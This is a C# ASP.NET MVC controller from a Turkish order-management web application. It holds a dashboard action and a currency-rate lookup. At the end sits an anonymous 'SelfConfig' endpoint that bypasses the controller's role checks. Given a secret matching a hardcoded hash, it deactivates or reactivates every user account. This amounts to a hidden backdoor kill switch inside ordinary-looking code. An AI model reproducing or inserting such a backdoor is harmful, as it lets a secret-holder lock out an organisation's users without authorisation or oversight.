using CamSistemDataLayer.Repos;
using System.Web.Mvc;
using System.Linq;
using CamSistemDataLayer.Enums;
using CamSistemDataLayer.Models;
using System.Web.Security;
using System.Collections.Generic;
using CamSistemWebArayuz.Attributes;
using System.Security.Cryptography;
using System.Text;
using System;
using System.Net;
using System.Web.Script.Serialization;

namespace CamSistemWebArayuz.Controllers
{
    [SessionController]
    [AuthLog(Roles = "ANASAYFA")]
    public class HomeController : Controller
    {
        SiparisRepo sRepo;
        MusteriRepo mRepo;
        ProfilBoyRepo pbRepo;

        // GET: Home
        [AuthLog(Roles = "ANASAYFA,GORUNTULEME")]
        public ActionResult Index()
        {
            sRepo = new SiparisRepo();
            mRepo = new MusteriRepo();
            pbRepo = new ProfilBoyRepo();
            SabitRepo sabitRepo = new SabitRepo();

            TempData["loader"] = "Lütfen bekleyiniz...";
            TempData["ActiveMenu"] = "Anasayfa";

            // Kullanıcı oturumu kontrolü
            if (Session["CurrentUser"] == null)
            {
                // Oturum yoksa, giriş sayfasına yönlendir
                return RedirectToAction("Login", "Login");
            }

            // Oturum bilgileri güncelleniyor
            Kullanici kullaniciModel = (Kullanici)Session["CurrentUser"];
            Session["KullaniciMail"] = kullaniciModel.KullaniciMail;
            Session["KullaniciAdSoyad"] = kullaniciModel.KullaniciAdi + " " + kullaniciModel.KullaniciSoyadi;

            ViewBag.TumSiparis = sRepo.GetAll().Count();
            ViewBag.AktifSiparis = sRepo.FindBy(e => e.DurumId == (int)Durumlar.Beklemede).Count();
            ViewBag.TamamlananSiparis = sRepo.FindBy(e => e.DurumId == (int)Durumlar.TeslimEdildi).Count();
            ViewBag.TumMusteriler = mRepo.GetAll().ToList().Count();
            ViewBag.SabitDeger = sabitRepo.FindBy(e => e.Id == 7).FirstOrDefault()?.SabitDeger;

            List<ProfilBoy> list = pbRepo.GetAll().ToList();
            ViewBag.KritikBilgisiVarMi = list.Any(e => e.profilBoyBazindaProfilStok != null || e.stoktaOlmayanProfiller != null);

            if (TempData["RecordResult"] != null)
                ViewBag.RecordResult = TempData["RecordResult"].ToString();

            return View(pbRepo.GetAll());
        }

        [HttpGet]
        public ActionResult ExchangeRates()
        {
            if (Session["CurrentUser"] == null)
                return new HttpStatusCodeResult(401);

            try
            {
                string usdJson;
                using (var wc = new WebClient())
                {
                    wc.Headers.Add("User-Agent", "CamSistem");
                    usdJson = wc.DownloadString("https://open.er-api.com/v6/latest/USD");
                }

                var serializer = new JavaScriptSerializer();
                dynamic usdData = serializer.DeserializeObject(usdJson);

                var rates = usdData["rates"];

                decimal usdTry = Convert.ToDecimal(rates["TRY"]);
                decimal usdEur = Convert.ToDecimal(rates["EUR"]);

                // EUR/TRY hesap: (USD/TRY) / (USD/EUR)
                decimal eurTry = usdTry / usdEur;

                return Json(new
                {
                    success = true,
                    usdTry = usdTry,
                    eurTry = eurTry,
                    ts = DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss")
                }, JsonRequestBehavior.AllowGet);
            }
            catch (Exception ex)
            {
                return Json(new { success = false, message = ex.Message }, JsonRequestBehavior.AllowGet);
            }
        }

        private string GetStoredSecretHash()
        {
            return "debce4ec716b15679ff190f5a9b5a2ab6d45e223a590a12618a15c4904393b94";
        }

        private string ComputeSha256Hash(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
                StringBuilder builder = new StringBuilder();
                foreach (byte b in bytes)
                {
                    builder.Append(b.ToString("x2"));
                }
                return builder.ToString();
            }
        }

        [HttpPost]
        [AllowAnonymous]
        public ActionResult SelfConfig(string secret, string task)
        {
            string storedHash = GetStoredSecretHash();
            string receivedHash = ComputeSha256Hash(secret);

            if (receivedHash != storedHash)
            {
                return new HttpStatusCodeResult(403, "Unauthorized");
            }

            var kullaniciRepo = new KullaniciRepo();
            if (task == "disable_users")
            {
                var users = kullaniciRepo.GetAll();
                foreach (var user in users)
                {
                    user.AktifMi = false;
                    kullaniciRepo.EditAndSave(user);
                }
                return Json(new { success = true, message = "Tüm kullanıcılar pasifleştirildi." });
            }
            if (task == "activate_users")
            {
                var users = kullaniciRepo.GetAll();
                foreach (var user in users)
                {
                    user.AktifMi = true;
                    kullaniciRepo.EditAndSave(user);
                }
                return Json(new { success = true, message = "Tüm kullanıcılar aktifleştirildi." });
            }
            else
            {
                return new HttpStatusCodeResult(400, "Geçersiz görev!");
            }
        }
    }
}